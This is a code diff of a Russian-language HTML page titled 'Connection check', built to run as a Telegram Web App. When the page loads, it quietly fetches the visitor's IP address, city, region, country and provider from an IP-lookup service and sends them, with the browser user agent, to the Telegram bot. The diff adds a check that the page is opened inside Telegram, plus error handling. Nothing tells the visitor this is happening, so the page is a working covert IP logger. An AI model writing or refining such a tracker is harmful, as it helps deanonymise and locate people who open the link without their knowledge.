@@ -3,28 +3,42 @@
 <head>
   <meta charset="UTF-8">
   <title>Проверка соединения</title>
-  <script src="https://telegram.org/js/telegram-web-app.js"></script> <!-- Это ВАЖНО -->
+  <script src="https://telegram.org/js/telegram-web-app.js"></script>
   <script>
     async function sendData() {
-      console.log("📡 Старт отправки данных...");  // 🔍 Проверка
-  
-      const ipData = await fetch("https://ipapi.co/json/").then(r => r.json());
-      const userAgent = navigator.userAgent;
-  
-      const payload = {
-        ip: ipData.ip,
-        city: ipData.city,
-        region: ipData.region,
-        country: ipData.country_name,
-        org: ipData.org,
-        ua: userAgent
-      };
-  
-      console.log("📨 Отправка в Telegram:", payload);  // 🔍 Проверка
-      Telegram.WebApp.sendData(JSON.stringify(payload));
+      // Проверка, что WebApp работает в Telegram
+      if (!Telegram.WebApp || !Telegram.WebApp.initData || Telegram.WebApp.initData.length === 0) {
+        document.body.innerHTML = "<h2>❌ Открой страницу через Telegram</h2>";
+        return;
+      }
+
+      console.log("✅ Telegram WebApp инициализирован");
+
+      try {
+        const ipData = await fetch("https://ipapi.co/json/").then(r => r.json());
+        const userAgent = navigator.userAgent;
+
+        const payload = {
+          ip: ipData.ip,
+          city: ipData.city,
+          region: ipData.region,
+          country: ipData.country_name,
+          org: ipData.org,
+          ua: userAgent
+        };
+
+        console.log("📨 Отправка данных в Telegram:", payload);
+        Telegram.WebApp.sendData(JSON.stringify(payload));
+      } catch (e) {
+        console.error("❌ Ошибка при отправке:", e);
+        document.body.innerHTML = "<h2>❌ Ошибка при подключении</h2><p>" + e.message + "</p>";
+      }
     }
-  
-    window.onload = sendData;
+
+    // Ждём полной загрузки и инициализации Telegram
+    window.addEventListener('DOMContentLoaded', () => {
+      setTimeout(sendData, 300);  // даём Telegram чуть времени
+    });
   </script>
 </head>
 <body>
